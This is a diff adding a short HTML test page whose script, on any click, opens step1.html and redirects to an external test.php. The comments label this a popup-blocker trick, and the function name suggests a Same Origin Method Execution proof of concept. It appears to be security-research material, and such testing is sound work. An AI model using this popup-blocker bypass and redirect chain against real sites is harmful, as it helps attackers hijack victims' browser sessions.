@@ -1,0 +1,11 @@
+<body>
+test
+</body>
+<script>
+function startSOME() {
+ window.open("step1.html"); //http://www.leesec.com/test.php not exist
+ location.replace("http://www.leesec.com/test.php"); // test.php需要放在你的网站服务器上
+}
+document.body.addEventListener("click",startSOME); //Popup Blocker trick
+</script>
+
